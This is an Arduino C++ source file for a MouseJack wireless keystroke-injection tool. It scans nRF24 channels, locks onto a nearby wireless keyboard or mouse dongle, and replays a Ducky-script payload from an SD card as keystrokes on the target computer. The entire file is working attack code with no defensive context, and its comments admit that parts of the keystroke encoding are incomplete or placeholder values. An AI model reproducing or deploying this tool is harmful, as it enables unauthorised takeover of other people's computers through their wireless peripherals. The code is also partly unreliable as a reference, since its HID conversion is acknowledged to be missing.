#include "MouseJack.h"
#include "Globals.h" 
#include <SPI.h>
#include <RF24.h>

// --- Settings ---
const uint8_t mj_channels[] = { 5, 12, 18, 20, 25, 26, 30, 35, 40, 46, 50, 51, 55, 60, 65, 70, 75, 80 };
int mj_ch_index = 0;

uint8_t targetAddr[5];
bool mj_targetLocked = false;
bool mj_initialized = false;

// --- HELPER FUNCTION: HID PACKET SENDER ---
void SendHIDPacket(uint8_t key, uint8_t mod) {
    uint8_t payload[16]; 
    memset(payload, 0, 16);
    
    payload[0] = 0x00; // Sequence
    payload[1] = mod;  // Modifier 
    payload[2] = key;  // HID Keycode
    
    radio.write(payload, 16); 
}

void SetupMouseJack() {
    if(mj_initialized) return;
    if(!radio.begin()) {
        TrapSerial.println("NRF Hardware Error!");
    }
    
    // --- !!! CRITICAL POWER SETTING (ANTI-CRASH) !!! ---
    // Power is reduced to prevent PA+LNA modules from crashing.
    // After soldering a capacitor, this can be set to RF24_PA_MAX.
    radio.setPALevel(RF24_PA_LOW); 
    // ---------------------------------------------
    
    radio.setAutoAck(false);
    radio.setDataRate(RF24_2MBPS);
    radio.disableCRC(); 
    radio.startListening();
    
    mj_targetLocked = false;
    mj_initialized = true;
    TrapSerial.println("MouseJack: SD Card Mode Active (Low Power)");
}

// --- CORE: DUCKY SCRIPT PARSER ---
void InjectLine(String line) {
    line.trim();
    if(line.length() == 0 || line.startsWith("REM")) return;

    display.fillRect(0, 40, 128, 24, SH110X_BLACK);
    display.setCursor(0,40); 
    display.print("> "); 
    if(line.length() > 18) display.print(line.substring(0,18));
    else display.print(line);
    display.display();

    // --- COMMAND PARSING ---
    if(line.startsWith("DELAY")) {
        int d = line.substring(6).toInt();
        delay(d);
    }
    else if(line.startsWith("STRING")) {
        String text = line.substring(7);
        TrapSerial.println("Yaziliyor: " + text);
        
        for(int i=0; i < text.length(); i++) {
            // Note: ASCII -> HID conversion is required.
            // Here, we are simply sending bytes.
            SendHIDPacket(text[i], 0); 
            delay(10);
        }
    }
    else if(line.startsWith("GUI") || line.startsWith("WINDOWS")) {
        TrapSerial.println("Tus: WIN");
        SendHIDPacket(0xE3, 0x08); // Example WIN key code
        delay(200);
    }
    else if(line.startsWith("ENTER")) {
        TrapSerial.println("Button: ENTER");
        SendHIDPacket(0x28, 0); // Enter HID code
        delay(100);
    }
}

void SelectPayloadAndFire() {
    if(!mj_targetLocked) {
        display.clearDisplay(); display.setCursor(0,20); display.println("TARGET NOT SELECTED!"); display.display(); delay(1000);
        return;
    }

    if(!sdAvailable) {
        display.clearDisplay(); display.setCursor(0,20); display.println("NO SD CARD!"); display.display(); delay(1000);
        return;
    }

    //  Opan File
    File payloadFile = SD.open("/payload.txt");
    if(payloadFile) {
        display.clearDisplay();
        display.setCursor(0,0); display.println("INJECTION...");
        display.drawLine(0, 10, 128, 10, SH110X_WHITE);
        display.setCursor(0,20); display.print("Target: "); 
        for(int i=0; i<5; i++) { display.print(targetAddr[i], HEX); if(i<4) display.print(":"); }
        display.display();

        radio.stopListening();
        radio.openWritingPipe(targetAddr);

        while(payloadFile.available()) {
            String line = payloadFile.readStringUntil('\n');
            InjectLine(line); 
        }
        payloadFile.close();
        
        display.clearDisplay();
        display.setCursor(0,25); display.println("ATTACK COMPLETED");
        display.display();
        delay(2000);
        
        radio.startListening();
        
    } else {
        TrapSerial.println("ERROR: /payload.txt not found!");
        display.clearDisplay();
        display.setCursor(0,20); display.println("PAYLOAD.TXT");
        display.setCursor(0,35); display.println("NOT FOUND!");
        display.display();
        delay(2000);
    }
}

void RunMouseJackScanner() {
    if(mj_targetLocked) return;

    // Kanal Hopla
    uint8_t currentChannel = mj_channels[mj_ch_index];
    radio.setChannel(currentChannel);
    
    // --- Display ---
    display.clearDisplay();
    display.setCursor(0,0); display.println("MOUSEJACK Scanning");
    display.drawLine(0, 10, 128, 10, SH110X_WHITE);
    
    display.setCursor(0,25); 
    display.print("Monitored Channel: "); 
    display.println(currentChannel);
    
    display.setCursor(0,45); 
    if(mj_ch_index % 3 == 0) display.println("Searching for Target.  ");
    else if(mj_ch_index % 3 == 1) display.println("Searching for Target. ");
    else display.println("Searching for Target...");
    display.display();

    mj_ch_index = (mj_ch_index + 1) % sizeof(mj_channels);
    
    radio.startListening();
    delay(50); 

    if(radio.available()) {
        uint8_t buf[32];
        radio.read(buf, sizeof(buf));
        
        // Check if incoming packet is empty (Simple Filter)
        bool validData = false;
        for(int i=0; i<10; i++) { if(buf[i] != 0x00 && buf[i] != 0xFF) validData = true; }

        if(validData) {
            for(int k=0; k<5; k++) targetAddr[k] = buf[k+2]; 
            
            mj_targetLocked = true;
            
            display.clearDisplay();
            display.setCursor(0,0); display.println("TARGET FOUND!");
            display.setCursor(0,20); display.print("CH: "); display.println(currentChannel);
            display.setCursor(0,35); display.print("MAC: "); display.print(targetAddr[0], HEX); display.println("...");
            display.setCursor(0,50); display.println("[BTN] ATTACK");
            display.display();
        }
    }
}

void StopMouseJack() {
    radio.powerDown();
    mj_targetLocked = false;
    mj_initialized = false;
}